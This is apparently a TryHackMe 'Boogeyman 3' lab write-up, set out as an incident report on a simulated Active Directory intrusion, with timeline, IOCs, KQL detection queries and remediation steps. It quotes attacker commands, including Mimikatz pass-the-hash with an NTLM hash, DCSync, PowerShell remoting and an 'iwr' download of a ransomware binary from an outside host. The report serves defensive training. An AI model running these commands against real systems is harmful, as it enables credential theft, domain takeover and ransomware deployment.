# TryHackMe_Boogeyman_3

# Boogeyman Investigation Report

## Executive Summary

This investigation identified a multi-stage intrusion affecting the `quicklogistics.org` environment. The attacker performed credential access, lateral movement through PowerShell remoting, credential dumping with Mimikatz, Pass-the-Hash authentication, DCSync attacks against Active Directory, and downloaded a ransomware payload onto the domain controller.

The attacker initially used compromised credentials to connect from `WKSTN-0051.quicklogistics.org` to `WKSTN-1327.quicklogistics.org`. After validating remote access with `whoami.exe`, the attacker used Mimikatz to perform Pass-the-Hash as the `administrator` account. The attacker then accessed `DC01.quicklogistics.org`, executed DCSync requests against both `administrator` and `backupda`, and downloaded the ransomware binary `ransomboogey.exe`.

> **Impact:** The attacker obtained or used privileged domain credentials, accessed the domain controller, extracted Active Directory account secrets through DCSync, and staged ransomware for execution. This represents a critical compromise of the Active Directory environment.

---

## Scope

| Item | Details |
|---|---|
| Environment | `quicklogistics.org` |
| Initial source host | `WKSTN-0051.quicklogistics.org` |
| Second compromised host | `WKSTN-1327.quicklogistics.org` |
| Domain controller | `DC01.quicklogistics.org` |
| Investigation focus | Lateral movement, credential access, Active Directory compromise, and ransomware staging |
| Key tools observed | PowerShell, WinRM, Mimikatz |
| Relevant date | 30 August 2023 |

---

## Attack Timeline

| Timestamp | Host | Activity | Evidence |
|---|---|---|---|
| Prior to lateral movement | `WKSTN-0051.quicklogistics.org` | Attacker used PowerShell remoting to connect to `WKSTN-1327` | `Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {whoami}` |
| During lateral movement | `WKSTN-1327.quicklogistics.org` | Remote command execution confirmed | `whoami.exe` launched by `wsmprovhost.exe` |
| 2023-08-30 01:31:39.366 | `WKSTN-1327.quicklogistics.org` | Mimikatz used to perform Pass-the-Hash as domain Administrator | `sekurlsa::pth /user:administrator /domain:QUICKLOGISTICS /ntlm:00f80f2538dcb54e7adc715c0e7091ec /run:powershell.exe` |
| After PTH activity | `DC01.quicklogistics.org` | DCSync executed against the `administrator` account | `lsadump::dcsync /domain:quicklogistics.org /user:administrator` |
| 2023-08-30 01:47:57.809 | `DC01.quicklogistics.org` | DCSync executed against a second account | `lsadump::dcsync /domain:quicklogistics.org /user:backupda` |
| 2023-08-30 01:53:13.738 | `DC01.quicklogistics.org` | Ransomware binary downloaded using PowerShell | `iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe` |

---

## Findings

### 1. PowerShell Remoting Lateral Movement

The attacker used PowerShell remoting from `WKSTN-0051.quicklogistics.org` to move laterally to `WKSTN-1327.quicklogistics.org`.

```powershell
Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {whoami}
```

On the destination endpoint, the command was executed as:

```text
Process: whoami.exe
Parent process: wsmprovhost.exe
```

`wsmprovhost.exe` is associated with Windows Remote Management and PowerShell remoting. This parent-child relationship confirms that the command was executed remotely through WinRM rather than interactively on the endpoint.

**MITRE ATT&CK mapping:** `T1021.006 - Windows Remote Management`

---

### 2. Credential Access and Pass-the-Hash

The attacker used Mimikatz on `WKSTN-1327.quicklogistics.org` to launch a PowerShell session using the NTLM hash of the `administrator` account.

```text
"C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe"
"sekurlsa::pth /user:administrator /domain:QUICKLOGISTICS
/ntlm:00f80f2538dcb54e7adc715c0e7091ec /run:powershell.exe" exit
```

Observed credential material:

```text
administrator:00f80f2538dcb54e7adc715c0e7091ec
```

The command used the Mimikatz `sekurlsa::pth` module. The `/run:powershell.exe` parameter indicates that the attacker spawned a new PowerShell process using the supplied NTLM hash.

**MITRE ATT&CK mapping:**

- `T1003 - OS Credential Dumping`
- `T1550.002 - Use Alternate Authentication Material: Pass the Hash`
- `T1059.001 - Command and Scripting Interpreter: PowerShell`

---

### 3. Domain Controller Compromise and DCSync

The attacker gained access to `DC01.quicklogistics.org` and used Mimikatz to perform DCSync activity. DCSync abuses Active Directory replication functionality to request account credential data from a domain controller.

The attacker targeted the following accounts:

```text
administrator
backupda
```

Evidence of DCSync against `administrator`:

```text
"C:\Users\Administrator\Documents\mimi\x64\mimikatz.exe"
"lsadump::dcsync /domain:quicklogistics.org /user:administrator" exit
```

Evidence of DCSync against `backupda`:

```text
"C:\Users\Administrator\Documents\mimi\x64\mimikatz.exe"
"lsadump::dcsync /domain:quicklogistics.org /user:backupda" exit
```

The DCSync activity occurred from a path within the `Administrator` user profile, indicating that the attacker had obtained highly privileged access within the environment.

**MITRE ATT&CK mapping:**

- `T1003.006 - OS Credential Dumping: DCSync`
- `T1003 - OS Credential Dumping`
- `T1078 - Valid Accounts`

---

### 4. Ransomware Download

After extracting credentials and obtaining access to the domain controller, the attacker downloaded a ransomware binary using PowerShell.

```powershell
iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe
```

Download source:

```text
http://ff.sillytechninja.io/ransomboogey.exe
```

Local file name:

```text
ransomboogey.exe
```

The use of `iwr`, an alias for `Invoke-WebRequest`, indicates that the attacker used PowerShell to retrieve the payload directly from a remote server.

**MITRE ATT&CK mapping:**

- `T1105 - Ingress Tool Transfer`
- `T1059.001 - Command and Scripting Interpreter: PowerShell`

---

## Indicators of Compromise

### Hosts

| Type | Value |
|---|---|
| Source workstation | `WKSTN-0051.quicklogistics.org` |
| Lateral movement destination | `WKSTN-1327.quicklogistics.org` |
| Domain controller | `DC01.quicklogistics.org` |

### Accounts

| Account | Relevance |
|---|---|
| `administrator` | Used for Pass-the-Hash and targeted through DCSync |
| `backupda` | Targeted through DCSync |
| `allan.smith` | User profile containing the Mimikatz binary on `WKSTN-1327` |

### Files and Paths

| Indicator | Value |
|---|---|
| Mimikatz path on workstation | `C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe` |
| Mimikatz path on domain controller | `C:\Users\Administrator\Documents\mimi\x64\mimikatz.exe` |
| Downloaded payload | `ransomboogey.exe` |
| Remote payload URL | `http://ff.sillytechninja.io/ransomboogey.exe` |

### Credential Material

```text
administrator:00f80f2538dcb54e7adc715c0e7091ec
```

> Treat the exposed NTLM hash as compromised. Rotate the affected account password and invalidate active sessions and Kerberos tickets as part of containment.

---

## Detection Queries

### Identify WinRM-Based Remote Commands

```kql
host.name: "WKSTN-1327.quicklogistics.org" and
process.parent.name: "wsmprovhost.exe"
```

### Identify Mimikatz Execution

```kql
host.name: "WKSTN-1327.quicklogistics.org" and
process.name: *mimikatz*
```

### Identify Pass-the-Hash Activity

```kql
host.name: "WKSTN-1327.quicklogistics.org" and
process.command_line: *sekurlsa::pth*
```

### Identify DCSync Commands

```kql
(
  process.command_line: *lsadump* or
  process.command_line: *dcsync* or
  process.command_line: *krbtgt*
)
```

### Identify PowerShell Downloads

```kql
host.name: "DC01.quicklogistics.org" and
(
  process.command_line: *http* or
  process.command_line: *Invoke-WebRequest* or
  process.command_line: *iwr* or
  process.command_line: *DownloadFile* or
  process.command_line: *WebClient*
)
```

---

## MITRE ATT&CK Coverage

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Lateral Movement | Windows Remote Management | `T1021.006` | PowerShell `Invoke-Command` to `WKSTN-1327` |
| Credential Access | OS Credential Dumping | `T1003` | Mimikatz execution and NTLM hash usage |
| Credential Access | DCSync | `T1003.006` | `lsadump::dcsync` against `administrator` and `backupda` |
| Defense Evasion / Credential Access | Pass the Hash | `T1550.002` | `sekurlsa::pth` using the Administrator NTLM hash |
| Execution | PowerShell | `T1059.001` | Remote PowerShell, PTH-spawned PowerShell, and `iwr` |
| Command and Control | Ingress Tool Transfer | `T1105` | Download of `ransomboogey.exe` from an external URL |
| Persistence / Privilege Escalation | Valid Accounts | `T1078` | Use of the `administrator` account and its NTLM hash |

---

## Recommended Response Actions

### Immediate Containment

- Isolate `WKSTN-0051`, `WKSTN-1327`, and `DC01` from the network while preserving forensic evidence.
- Block outbound access to `ff.sillytechninja.io` at DNS, proxy, firewall, and endpoint-control layers.
- Locate and quarantine `ransomboogey.exe` across all endpoints.
- Block and investigate executions of `mimikatz.exe`, especially from user profile directories such as `Documents`.
- Identify all systems that communicated with the malicious download domain.

### Credential Remediation

- Reset passwords for `administrator`, `backupda`, `allan.smith`, and any account used by the attacker.
- Treat all privileged Active Directory credentials as potentially compromised.
- Reset the `krbtgt` account password twice following an approved Active Directory recovery procedure.
- Revoke active sessions, refresh privileged access tokens, and invalidate Kerberos tickets where possible.
- Review membership of Domain Admins, Enterprise Admins, Backup Operators, and delegated replication-rights groups.

### Investigation Expansion

- Review all PowerShell, WinRM, Sysmon, Windows Security, and EDR telemetry around 30 August 2023.
- Search enterprise-wide for command-line strings including `sekurlsa::pth`, `lsadump::dcsync`, `Invoke-Command`, `wsmprovhost.exe`, and `ransomboogey.exe`.
- Investigate Security Event ID `4662` on domain controllers for abnormal directory replication access.
- Review network logs for connections to `ff.sillytechninja.io`.
- Determine whether the ransomware payload executed, what files it modified, and whether it propagated to additional hosts.

### Hardening Measures

- Restrict PowerShell remoting and WinRM to approved management hosts and administrators.
- Enable PowerShell Script Block Logging, Module Logging, and Transcription.
- Enforce endpoint detection controls for credential-dumping behavior and LSASS access.
- Limit accounts with Active Directory replication permissions.
- Implement privileged access workstations for administrative activities.
- Use unique local administrator passwords through Windows LAPS or an equivalent privileged access solution.
- Apply application control to prevent unauthorized executables from running from user-writable directories.

---

## Conclusion

The attacker progressed from compromised workstation access to domain-level compromise through a coordinated sequence of PowerShell remoting, credential abuse, Mimikatz Pass-the-Hash, DCSync, and ransomware staging.

The most critical finding is the compromise of Active Directory credentials from the domain controller. Because the attacker executed DCSync against privileged accounts and downloaded ransomware onto `DC01`, the incident should be treated as a high-severity domain compromise requiring immediate containment, comprehensive credential remediation, and validation of Active Directory integrity.
